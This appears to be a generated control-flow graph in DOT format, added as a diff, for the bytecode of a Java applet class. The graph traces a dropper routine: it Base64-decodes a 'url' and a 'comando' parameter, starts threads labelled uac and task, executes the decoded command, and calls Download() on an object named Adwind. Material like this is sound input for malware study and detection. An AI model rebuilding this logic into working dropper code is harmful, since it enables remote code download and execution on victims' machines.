@@ -1,0 +1,218 @@
+digraph "" {
+    "r0 := @this: Principal"
+    "store.r $r6"
+    "r0 := @this: Principal"->"store.r $r6";
+    "push class \"LPrincipal;\""
+    "store.r $r6"->"push class \"LPrincipal;\"";
+    "virtualinvoke <java.lang.Class: java.lang.String getName()>"
+    "push class \"LPrincipal;\""->"virtualinvoke <java.lang.Class: java.lang.String getName()>";
+    "staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>"
+    "virtualinvoke <java.lang.Class: java.lang.String getName()>"->"staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>";
+    "staticget <java.util.logging.Level: java.util.logging.Level SEVERE>"
+    "staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>"->"staticget <java.util.logging.Level: java.util.logging.Level SEVERE>";
+    "push null"
+    "staticget <java.util.logging.Level: java.util.logging.Level SEVERE>"->"push null";
+    "load.r $r6"
+    "push null"->"load.r $r6";
+    "virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>"
+    "load.r $r6"->"virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>";
+    "goto new Principal$1"
+    "virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>"->"goto new Principal$1";
+    "new Principal$1"
+    "goto new Principal$1"->"new Principal$1";
+    "dup1.r"
+    "new Principal$1"->"dup1.r";
+    "load.r r0"
+    "dup1.r"->"load.r r0";
+    "specialinvoke <Principal$1: void <init>(Principal)>"
+    "load.r r0"->"specialinvoke <Principal$1: void <init>(Principal)>";
+    "staticinvoke <java.awt.EventQueue: void invokeAndWait(java.lang.Runnable)>"
+    "specialinvoke <Principal$1: void <init>(Principal)>"->"staticinvoke <java.awt.EventQueue: void invokeAndWait(java.lang.Runnable)>";
+    "goto load.r r0"
+    "staticinvoke <java.awt.EventQueue: void invokeAndWait(java.lang.Runnable)>"->"goto load.r r0";
+    "goto load.r r0"->"load.r r0";
+    "push \"url\""
+    "load.r r0"->"push \"url\"";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"
+    "push \"url\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "new java.lang.String"
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"new java.lang.String";
+    "new java.lang.String"->"store.r $r6";
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"
+    "store.r $r6"->"staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>";
+    "store.r $r7"
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"->"store.r $r7";
+    "store.r $r7"->"load.r $r6";
+    "load.r $r7"
+    "load.r $r6"->"load.r $r7";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"
+    "load.r $r7"->"specialinvoke <java.lang.String: void <init>(byte[])>";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"->"load.r r0";
+    "push \"extension\""
+    "load.r r0"->"push \"extension\"";
+    "push \"extension\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "store.r i1"
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r i1";
+    "store.r i1"->"load.r r0";
+    "push \"prefijo\""
+    "load.r r0"->"push \"prefijo\"";
+    "push \"prefijo\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "store.r r42"
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r r42";
+    "store.r r42"->"load.r r0";
+    "push \"comando\""
+    "load.r r0"->"push \"comando\"";
+    "push \"comando\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"new java.lang.String";
+    "new java.lang.String"->"store.r $r7";
+    "store.r $r7"->"staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>";
+    "store.r r2"
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"->"store.r r2";
+    "store.r r2"->"load.r $r7";
+    "load.r r2"
+    "load.r $r7"->"load.r r2";
+    "load.r r2"->"specialinvoke <java.lang.String: void <init>(byte[])>";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"->"load.r r0";
+    "push \"uac\""
+    "load.r r0"->"push \"uac\"";
+    "push \"uac\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"load.r r0";
+    "push \"task\""
+    "load.r r0"->"push \"task\"";
+    "push \"task\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r r2";
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"
+    "store.r r2"->"staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>";
+    "store.b r0"
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"->"store.b r0";
+    "store.b r0"->"load.r r2";
+    "load.r r2"->"staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>";
+    "store.b r2"
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"->"store.b r2";
+    "new uac"
+    "store.b r2"->"new uac";
+    "new uac"->"dup1.r";
+    "load.b r0"
+    "dup1.r"->"load.b r0";
+    "specialinvoke <uac: void <init>(boolean)>"
+    "load.b r0"->"specialinvoke <uac: void <init>(boolean)>";
+    "virtualinvoke <uac: void start()>"
+    "specialinvoke <uac: void <init>(boolean)>"->"virtualinvoke <uac: void start()>";
+    "new task"
+    "virtualinvoke <uac: void start()>"->"new task";
+    "new task"->"dup1.r";
+    "load.b r2"
+    "dup1.r"->"load.b r2";
+    "specialinvoke <task: void <init>(boolean)>"
+    "load.b r2"->"specialinvoke <task: void <init>(boolean)>";
+    "virtualinvoke <task: void start()>"
+    "specialinvoke <task: void <init>(boolean)>"->"virtualinvoke <task: void start()>";
+    "virtualinvoke <task: void start()>"->"load.r $r7";
+    "virtualinvoke <java.lang.String: boolean isEmpty()>"
+    "load.r $r7"->"virtualinvoke <java.lang.String: boolean isEmpty()>";
+    "ifne new Adwind"
+    "virtualinvoke <java.lang.String: boolean isEmpty()>"->"ifne new Adwind";
+    "ifne new Adwind"->"load.r $r7";
+    "virtualinvoke <java.lang.String: java.lang.String trim()>"
+    "load.r $r7"->"virtualinvoke <java.lang.String: java.lang.String trim()>";
+    "staticinvoke <Tools: void execute(java.lang.String)>"
+    "virtualinvoke <java.lang.String: java.lang.String trim()>"->"staticinvoke <Tools: void execute(java.lang.String)>";
+    "new Adwind"
+    "staticinvoke <Tools: void execute(java.lang.String)>"->"new Adwind";
+    "new Adwind"->"dup1.r";
+    "dup1.r"->"load.r $r6";
+    "new java.lang.StringBuilder"
+    "load.r $r6"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \".\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \".\"";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "push \".\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "load.r i1"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r i1";
+    "load.r i1"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "load.r r42"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"load.r r42";
+    "specialinvoke <Adwind: void <init>(java.lang.String,java.lang.String,java.lang.String)>"
+    "load.r r42"->"specialinvoke <Adwind: void <init>(java.lang.String,java.lang.String,java.lang.String)>";
+    "virtualinvoke <Adwind: void Download()>"
+    "specialinvoke <Adwind: void <init>(java.lang.String,java.lang.String,java.lang.String)>"->"virtualinvoke <Adwind: void Download()>";
+    "return"
+    "virtualinvoke <Adwind: void Download()>"->"return";
+    "virtualinvoke <java.lang.Exception: void printStackTrace()>"
+    "staticinvoke <java.awt.EventQueue: void invokeAndWait(java.lang.Runnable)>"->"virtualinvoke <java.lang.Exception: void printStackTrace()>";
+    "r0 := @this: Principal"->"store.r $r6";
+    "store.r $r6"->"push class \"LPrincipal;\"";
+    "push class \"LPrincipal;\""->"virtualinvoke <java.lang.Class: java.lang.String getName()>";
+    "virtualinvoke <java.lang.Class: java.lang.String getName()>"->"staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>";
+    "staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>"->"staticget <java.util.logging.Level: java.util.logging.Level SEVERE>";
+    "staticget <java.util.logging.Level: java.util.logging.Level SEVERE>"->"push null";
+    "push null"->"load.r $r6";
+    "load.r $r6"->"virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>";
+    "virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>"->"goto new Principal$1";
+    "r0 := @this: Principal"->"store.r $r6";
+    "store.r $r6"->"push class \"LPrincipal;\"";
+    "push class \"LPrincipal;\""->"virtualinvoke <java.lang.Class: java.lang.String getName()>";
+    "virtualinvoke <java.lang.Class: java.lang.String getName()>"->"staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>";
+    "staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>"->"staticget <java.util.logging.Level: java.util.logging.Level SEVERE>";
+    "staticget <java.util.logging.Level: java.util.logging.Level SEVERE>"->"push null";
+    "push null"->"load.r $r6";
+    "load.r $r6"->"virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>";
+    "virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>"->"goto new Principal$1";
+    "r0 := @this: Principal"->"store.r $r6";
+    "store.r $r6"->"push class \"LPrincipal;\"";
+    "push class \"LPrincipal;\""->"virtualinvoke <java.lang.Class: java.lang.String getName()>";
+    "virtualinvoke <java.lang.Class: java.lang.String getName()>"->"staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>";
+    "staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>"->"staticget <java.util.logging.Level: java.util.logging.Level SEVERE>";
+    "staticget <java.util.logging.Level: java.util.logging.Level SEVERE>"->"push null";
+    "push null"->"load.r $r6";
+    "load.r $r6"->"virtualinvoke <java.util.logging.Logger: void log(java.util.logging.Level,java.lang.String,java.lang.Throwable)>";
+    "staticinvoke <javax.swing.UIManager: javax.swing.UIManager$LookAndFeelInfo[] getInstalledLookAndFeels()>"
+    "r0 := @this: Principal"->"staticinvoke <javax.swing.UIManager: javax.swing.UIManager$LookAndFeelInfo[] getInstalledLookAndFeels()>";
+    "staticinvoke <javax.swing.UIManager: javax.swing.UIManager$LookAndFeelInfo[] getInstalledLookAndFeels()>"->"store.r $r6";
+    "store.r $r6"->"load.r $r6";
+    "arraylength"
+    "load.r $r6"->"arraylength";
+    "store.i $r7"
+    "arraylength"->"store.i $r7";
+    "push 0"
+    "store.i $r7"->"push 0";
+    "store.i i1"
+    "push 0"->"store.i i1";
+    "load.i i1"
+    "store.i i1"->"load.i i1";
+    "load.i $r7"
+    "load.i i1"->"load.i $r7";
+    "ifcmpge.i goto new Principal$1"
+    "load.i $r7"->"ifcmpge.i goto new Principal$1";
+    "ifcmpge.i goto new Principal$1"->"load.r $r6";
+    "load.r $r6"->"load.i i1";
+    "arrayread.r"
+    "load.i i1"->"arrayread.r";
+    "arrayread.r"->"store.r r42";
+    "push \"Nimbus\""
+    "store.r r42"->"push \"Nimbus\"";
+    "push \"Nimbus\""->"load.r r42";
+    "virtualinvoke <javax.swing.UIManager$LookAndFeelInfo: java.lang.String getName()>"
+    "load.r r42"->"virtualinvoke <javax.swing.UIManager$LookAndFeelInfo: java.lang.String getName()>";
+    "virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>"
+    "virtualinvoke <javax.swing.UIManager$LookAndFeelInfo: java.lang.String getName()>"->"virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>";
+    "ifeq inc.i i1 1"
+    "virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>"->"ifeq inc.i i1 1";
+    "ifeq inc.i i1 1"->"load.r r42";
+    "virtualinvoke <javax.swing.UIManager$LookAndFeelInfo: java.lang.String getClassName()>"
+    "load.r r42"->"virtualinvoke <javax.swing.UIManager$LookAndFeelInfo: java.lang.String getClassName()>";
+    "staticinvoke <javax.swing.UIManager: void setLookAndFeel(java.lang.String)>"
+    "virtualinvoke <javax.swing.UIManager$LookAndFeelInfo: java.lang.String getClassName()>"->"staticinvoke <javax.swing.UIManager: void setLookAndFeel(java.lang.String)>";
+    "goto goto new Principal$1"
+    "staticinvoke <javax.swing.UIManager: void setLookAndFeel(java.lang.String)>"->"goto goto new Principal$1";
+    "goto goto new Principal$1"->"goto new Principal$1";
+    "inc.i i1 1"
+    "ifeq inc.i i1 1"->"inc.i i1 1";
+    "goto load.i i1"
+    "inc.i i1 1"->"goto load.i i1";
+}
